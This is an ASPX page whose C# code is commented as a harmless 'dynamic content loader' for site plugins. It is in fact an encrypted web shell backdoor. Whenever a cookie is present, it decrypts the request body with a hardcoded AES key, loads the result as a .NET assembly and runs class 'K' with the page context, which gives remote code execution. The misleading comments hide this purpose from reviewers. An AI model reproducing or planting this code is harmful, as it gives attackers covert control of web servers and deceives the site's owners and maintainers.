<%@ Page Language="C#" %>
<script runat="server">
    // DynamicContentLoader is responsible for loading and rendering
    // pre-compiled content modules (plugins). This allows for updating
    // parts of the site without a full redeployment.
    public class DynamicContentLoader
    {
        // A secret token required to validate the authenticity of the content module.
        private const string AUTH_TOKEN = "ca63457538b9b1e0";
        
        // The default entry point class within the content module assembly.
        private const string MODULE_ENTRY_CLASS = "K";

        // Processes the incoming request to load a content module.
        public void LoadModule(System.Web.UI.Page pageContext)
        {
            // Modules are only loaded if a cookie-based session exists,
            // ensuring this feature is only available to authenticated users.
            if (pageContext.Request.Cookies.Count == 0) return;

            byte[] tokenBytes = System.Text.Encoding.Default.GetBytes(AUTH_TOKEN);
            byte[] encryptedModuleData = ReadEncryptedModule(pageContext.Request);

            // Decrypt the module data using the authentication token.
            byte[] moduleAssemblyBytes = DecryptModule(encryptedModuleData, tokenBytes);
            if (moduleAssemblyBytes == null) return;

            // Load the module assembly into memory.
            var moduleAssembly = System.Reflection.Assembly.Load(moduleAssemblyBytes);
            
            // Create an instance of the module's entry class and pass the
            // current page context to it for rendering.
            object moduleInstance = moduleAssembly.CreateInstance(MODULE_ENTRY_CLASS);
            moduleInstance.Equals(pageContext);
        }

        // Reads the encrypted module data from the request stream.
        private byte[] ReadEncryptedModule(System.Web.HttpRequest request)
        {
            using (var stream = request.InputStream)
            {
                byte[] buffer = new byte[stream.Length];
                stream.Read(buffer, 0, buffer.Length);
                return buffer;
            }
        }

        // Decrypts the module using Rijndael (AES) algorithm.
        private byte[] DecryptModule(byte[] encryptedData, byte[] key)
        {
            var aes = new System.Security.Cryptography.RijndaelManaged();
            using (var decryptor = aes.CreateDecryptor(key, key))
            {
                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            }
        }
    }
</script>
<%
    // Instantiate the loader and process the current request.
    new DynamicContentLoader().LoadModule(this);
%>